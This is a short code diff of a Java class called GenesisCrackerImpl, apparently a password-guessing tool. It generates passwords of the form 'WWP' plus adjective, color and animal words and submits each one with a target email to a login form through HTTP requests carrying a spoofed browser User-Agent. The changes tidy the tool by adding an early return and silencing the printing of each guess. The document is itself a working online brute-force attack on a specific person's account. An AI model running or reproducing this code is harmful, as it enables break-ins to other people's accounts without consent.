@@ -89,7 +89,7 @@ public class GenesisCrackerImpl implements GenesisCracker {
     }
 
     public boolean crack() throws IOException {
-        Check.notNull(this.adjectiveFile, this.colorFile, this.animalFile, this.email);
+        if(!Check.notNull(this.adjectiveFile, this.colorFile, this.animalFile, this.email)) return false;
 
         List<String> ad = new ArrayList<>();
         List<String> co = new ArrayList<>();
@@ -130,7 +130,7 @@ public class GenesisCrackerImpl implements GenesisCracker {
                         }
 
                         String pass = "WWP" + i + j + k + l;
-                        System.out.println(pass);
+                        //System.out.println(pass);
                         RequestBody body = RequestBody.create(this.CONTENT_TYPE, "j_username=" + this.email + "&j_password=" + pass);
                         Request request = new Request.Builder()
                                 .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
